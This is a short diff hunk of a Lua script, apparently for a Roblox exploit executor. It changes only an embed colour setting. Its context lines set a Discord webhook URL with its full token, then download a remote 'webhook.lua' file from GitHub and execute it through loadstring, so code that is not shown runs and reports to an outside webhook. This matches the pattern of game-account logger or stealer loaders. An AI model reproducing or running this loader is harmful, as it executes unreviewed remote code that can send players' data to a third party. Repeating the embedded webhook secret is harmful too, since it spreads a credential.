@@ -468,7 +468,7 @@ end
     end)
 end
 
-_G.EmbedColor = 7903521
+_G.EmbedColor = 14869218
 _G.BasicStyling = false
 getgenv().hook = "https://discord.com/api/webhooks/1534301369656283168/JjwLUv2H59RIXKVSLOQNcMGUW6FljFUit309ENKx-9R7Xsu8w6Mps5LPM3DKC3yPWxyk"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Attypical/nality/refs/heads/main/webhook.lua", true))()
